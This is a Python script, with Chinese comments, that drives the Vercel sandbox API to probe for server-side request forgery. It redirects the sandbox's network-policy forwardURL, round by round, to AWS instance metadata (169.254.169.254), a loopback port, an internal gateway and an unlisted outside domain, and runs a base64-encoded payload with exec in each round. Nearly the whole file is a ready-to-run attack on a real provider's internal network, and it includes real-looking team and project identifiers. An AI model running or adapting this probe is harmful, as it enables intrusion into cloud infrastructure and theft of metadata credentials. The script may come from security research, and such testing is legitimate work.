# 本地驱动: 逐轮 update forwardURL 目标 -> 沙箱请求, 测 SSRF
import json, base64, pathlib, urllib.request, urllib.error, sys

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

# 重新创建沙箱(超时停止后需重建)
def fresh_sandbox(name):
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name,
                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
    print("create:", c)
    d = json.loads(r)
    sid = d["sandbox"]["currentSessionId"]
    print("sid:", sid)
    return sid

def api(method, path, body=None):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=60) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]

SID = fresh_sandbox("expe3")

def run_round(label, fwd_url, match_path, req_path):
    print(f"\n########## ROUND {label}: forwardURL={fwd_url} match={match_path} ##########", flush=True)
    c, r = api("POST", f"/v2/sandboxes/sessions/{SID}/network-policy?teamId={TEAM}",
               {"allow": {"httpbin.org": [{"match": {"path": {"exact": match_path}},
                                            "forwardURL": fwd_url}]}})
    if c != 200:
        print(f"update FAILED: {c} {r[:300]}")
        return False
    print("update OK")
    payload = base64.b64encode(pathlib.Path("exp_e3.py").read_bytes()).decode()
    body = {"command": "python3", "args": ["-c",
            f"import base64;exec(base64.b64decode('{payload}').decode())", label],
            "wait": True, "logs": True, "timeout": 60000}
    c, r = api("POST", f"/v2/sandboxes/sessions/{SID}/cmd?teamId={TEAM}", body)
    print(f"cmd: {c}")
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="")
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"))
        except Exception:
            print(line[:300])
    return True

# 轮次0: 对照 - https 公网转发恢复基线
run_round("R0-BASELINE", "https://httpbin.org/anything", "/latest", "/latest")
# 轮次1: AWS IMDS (https)
run_round("R1-IMDS", "https://169.254.169.254", "/latest", "/latest")
# 轮次2: 回环端口 (https)
run_round("R2-LOOPBACK", "https://127.0.0.1:26661", "/console", "/console")
# 轮次3: 内部网关 (https)
run_round("R3-GATEWAY", "https://100.64.0.1", "/gw", "/gw")
# 轮次4: 公网 https 对照
run_round("R4-PUBLIC", "https://example.com", "/plain", "/plain")
# 轮次5: 任意公网域(不在 allowedDomains) https
run_round("R5-FOREIGN", "https://postman-echo.com", "/echo", "/echo")
